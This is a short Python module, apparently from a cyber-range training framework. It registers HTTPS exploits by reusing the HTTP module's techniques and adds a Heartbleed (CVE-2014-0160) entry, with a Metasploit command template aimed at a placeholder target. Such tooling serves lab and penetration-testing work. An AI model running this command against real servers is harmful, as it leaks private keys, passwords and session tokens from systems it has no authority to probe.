"""
HTTPS Exploit Module — Port 443
Alias for port_80_http (same techniques apply over SSL)
"""
from cyber_range.modules.port_80_http import EXPLOITS, enumerate, exploit

MODULE_INFO = {
    "port": 443, "service": "https",
    "name": "HTTPS Web Exploit Module",
    "description": "Web application scanning over SSL/TLS — same techniques as HTTP plus SSL-specific checks",
    "author": "Custom", "mitre": ["T1190", "T1059.007"],
}

# Additional SSL-specific exploit
EXPLOITS = EXPLOITS + [
    {"name": "SSL/TLS Heartbleed Check (CVE-2014-0160)", "source": "metasploit", "type": "auxiliary",
     "msf_module": "auxiliary/scanner/ssl/openssl_heartbleed",
     "description": "Tests for Heartbleed — leaks server memory including passwords and private keys",
     "exec_command": "msfconsole -q -x 'use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS {target}; run; exit'",
     "risk": "Critical — leaks encryption keys, passwords, and session tokens"},
]
